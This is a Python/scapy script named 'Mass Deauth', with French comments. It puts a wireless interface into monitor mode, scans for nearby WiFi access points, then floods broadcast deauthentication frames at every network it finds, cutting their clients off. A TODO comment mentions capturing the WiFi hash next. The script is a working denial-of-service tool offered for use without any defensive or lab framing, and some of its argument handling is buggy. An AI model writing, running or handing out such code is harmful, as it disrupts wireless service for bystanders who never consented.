#!/usr/bin/python3
from scapy.all import *
from scapy.layers import *
from prettytable import PrettyTable
import argparse
import sys

"""
TODO

chopper le hash wifi

"""

packet_sniff_timeout = 10
deauth_packets = 100





def main():
    print("""


    ███╗   ███╗ █████╗ ███████╗███████╗    ██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗
    ████╗ ████║██╔══██╗██╔════╝██╔════╝    ██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║
    ██╔████╔██║███████║███████╗███████╗    ██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║
    ██║╚██╔╝██║██╔══██║╚════██║╚════██║    ██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║
    ██║ ╚═╝ ██║██║  ██║███████║███████║    ██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║
    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝

        """)
    # pour le --help
    parser = argparse.ArgumentParser(description='Mass Deauth wifi script\n\n Give to the script the interface name and the monitor interface name [without this wlan0 by default]')
    args = parser.parse_args()
    #verif droit sudo 
    if not os.geteuid() == 0:
        print("[!] SUDO requied, please make a sudo command")
        sys.exit()
    else:
        pass
main()


#conf si le user n'a rien mis
if len(sys.argv) < 2:
    print("[+] Okay ! by default wlan0 interface !")
    interface = "wlan0"
    wlanmon = "wlan0"

#conf si ya bien les args
if len(sys.argv) > 2:
    interface = sys.argv[0]
    wlanmon = sys.argv[1]

# mode Monitor
#os.system(f"ifconfig {interface} down")
#os.system(f"iwconfig {interface} mode monitor")
#os.system(f"ifconfig {interface} up")
os.system("airmon-ng check kill")
os.system(f"airmon-ng start {interface} > /dev/null") # > /dev/null pour 0 output


# Fonction pour scanner les réseaux WiFi
def scan_wifi_networks():
    global bssid_list, ssid_list
    networks = []
    bssid_list = []
    ssid_list = []
    ssid_set = set()

    # Fonction de rappel pour chaque paquet reçu
    def packet_handler(packet):
        global channel, bssid, ssid
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11Elt].info.decode()
            bssid = packet[Dot11].addr2
            channel = int(packet[Dot11Elt:3].info[0])
            if bssid not in ssid_set:
                ssid_set.add(bssid)
                networks.append((bssid, ssid, channel))
                bssid_list.append(bssid)
                ssid_list.append(ssid)
                
    # Capture des paquets WiFi
    sniff(iface=f"{wlanmon}", prn=packet_handler, timeout=packet_sniff_timeout)

    return networks

# Fonction pour afficher les réseaux WiFi
def display_wifi_networks(networks):
    table = PrettyTable(["Adresse MAC", "Nom du réseau", "Canal"])
    for network in networks:
        table.add_row(network)
    print(table)

networks = scan_wifi_networks()

# Affichage des réseaux WiFi
display_wifi_networks(networks)


#prise d'infos (client pour deauth)
if bssid != False:
    for mac in bssid_list: 
        
        #pas besoin d'avoir le MAC du client pour deauth...

        def deauth_wifi(mac, interface):
            #construction de la requete deauth, avec la MAC de broadcast

            packet = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=mac, addr3=mac)/Dot11Deauth()

            print(f"[+] DeAuth for MAC : {mac}")

            sendp(packet, iface=interface, count=deauth_packets, inter=0.1, verbose=1)

            # BOOM wifi deauth

        deauth_wifi(mac, interface)

else:
    print("[-] No wifi hotspot found !")





# kill monitor mode
os.system(f"airmon-ng stop {interface} > /dev/null ")
